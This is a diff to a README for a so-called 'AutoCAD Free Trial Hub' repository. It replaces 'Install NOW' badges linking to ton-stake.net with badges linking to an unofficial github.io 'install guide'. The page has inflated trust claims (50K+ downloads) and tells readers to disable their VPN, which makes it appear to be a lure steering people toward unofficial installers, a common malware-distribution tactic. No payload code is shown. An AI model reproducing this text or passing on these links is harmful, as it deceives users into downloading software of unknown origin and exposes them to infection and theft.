@@ -7,9 +7,9 @@
 
 **Description**: Unlock professional design with the **AutoCAD Free Trial Hub** in 2025! This repository offers exclusive tutorials, resources, and tips to explore 2D/3D drafting, automation, and industry-specific tools. Join our trusted community with 50K+ downloads and 20K+ subscribers!  
 
-[![Install AutoCAD](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://autocad-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 📋 Installation Guide  
 
@@ -30,9 +30,9 @@ Start your 30-day AutoCAD trial with these simple steps to access free resources
 5. **Access Problems?** 🌐  
    If the package access fails, try disabling your VPN or switching browsers (e.g., Chrome, Firefox).  
 
-[![Install AutoCAD](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://autocad-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 💡 Why Choose AutoCAD Free Trial  
 
